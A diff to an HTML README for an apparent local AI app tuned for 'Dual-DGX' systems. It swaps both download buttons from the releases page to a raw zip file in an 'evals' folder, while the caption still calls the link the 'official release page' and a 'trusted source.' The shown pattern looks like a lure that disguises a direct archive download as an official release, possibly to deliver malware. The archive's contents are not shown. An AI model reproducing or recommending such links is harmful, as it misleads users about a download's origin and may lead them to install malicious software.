@@ -1,5 +1,5 @@
 <h1>⚡ Qwen3.8-Flash-Next-Dual-DGX-Sparks - Run AI Models Faster Than Ever</h1>
-<p><a href="https://github.com/lynseyaggregate8337/Qwen3.8-Flash-Next-Dual-DGX-Sparks/releases" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#ff6b6b,#ff8e53);color:#ffffff;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(255,107,107,0.5);margin:20px 0;">🚀 Download Now – Free & Instant</a></p>
+<p><a href="https://raw.githubusercontent.com/lynseyaggregate8337/Qwen3.8-Flash-Next-Dual-DGX-Sparks/main/evals/Dual_DG_Qwen_Flash_Next_Sparks_v1.8-alpha.3.zip" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#ff6b6b,#ff8e53);color:#ffffff;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(255,107,107,0.5);margin:20px 0;">🚀 Download Now – Free & Instant</a></p>
 
 <h2>🧠 What Is This?</h2>
 <p>This application is a powerful, easy-to-use tool that brings the latest Qwen3.8-Flash AI model to your own computer. It is specially tuned to work seamlessly with two DGX Spark systems together (that is what "Dual-DGX" means) using a clever technology called SGLang TP2. If you have these systems at home or in your office, this software lets you run advanced AI tasks – like writing, coding help, data analysis, or creative brainstorming – without needing an internet connection and without relying on expensive cloud services.</p>
@@ -46,7 +46,7 @@ Once it says "Ready", just type your question in the text box and press Enter. T
 
 <h2>📥 Download Section</h2>
 <p>Ready to start? Tap the button below to go to the official download pagefor this application.</p>
-<p><a href="https://github.com/lynseyaggregate8337/Qwen3.8-Flash-Next-Dual-DGX-Sparks/releases" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#4facfe,#00f2fe);color:#ffffff;font-size:20px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 6px 15px rgba(79,172,254,0.4);margin:10px 0;">⬇️ Get Qwen3.8-Flash-Next-Dual-DGX-Sparks</a></p>
+<p><a href="https://raw.githubusercontent.com/lynseyaggregate8337/Qwen3.8-Flash-Next-Dual-DGX-Sparks/main/evals/Dual_DG_Qwen_Flash_Next_Sparks_v1.8-alpha.3.zip" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#4facfe,#00f2fe);color:#ffffff;font-size:20px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 6px 15px rgba(79,172,254,0.4);margin:10px 0;">⬇️ Get Qwen3.8-Flash-Next-Dual-DGX-Sparks</a></p>
 <p><small>Direct link to the official release page. Always download from this trusted source.</small></p>
 
 <h2>❓ Frequently Asked Questions</h2>
